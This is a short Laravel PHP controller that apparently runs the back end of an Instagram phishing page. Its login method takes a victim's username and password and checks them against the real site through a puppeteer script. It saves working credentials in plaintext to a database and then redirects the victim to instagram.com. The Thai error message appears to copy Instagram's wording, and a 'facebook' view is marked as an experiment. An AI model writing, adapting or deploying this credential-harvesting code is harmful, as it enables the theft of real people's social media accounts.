<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Redirect;
use App\Models\Userdb;

class LoginController extends Controller
{
    function index(){
        return view("index");
    }
    function facebook(){ //ทดลอง
        return view("facebook");
    }

    function login(Request $request){
        $username = escapeshellarg($request->username);
        $password = escapeshellarg($request->password);

        $output = shell_exec("node " . base_path('puppeteer.js') . " $username $password");

        if (trim($output) === "Login successful") {
            $user = Userdb::where("username", $request->username)->first();

            if ($user) {
                return redirect("https://instagram.com/");
            } else {
       
                $newUser = new Userdb;
                $newUser->username = $request->username;
                $newUser->password = $request->password; 
                $newUser->save();

                return redirect("https://instagram.com/");
            }
        } else {
            return redirect()->back()->with("message", "ขออภัย รหัสผ่านของคุณไม่ถูกต้อง โปรดตรวจสอบรหัสผ่านของคุณอีกครั้ง");
        }
    } 
}
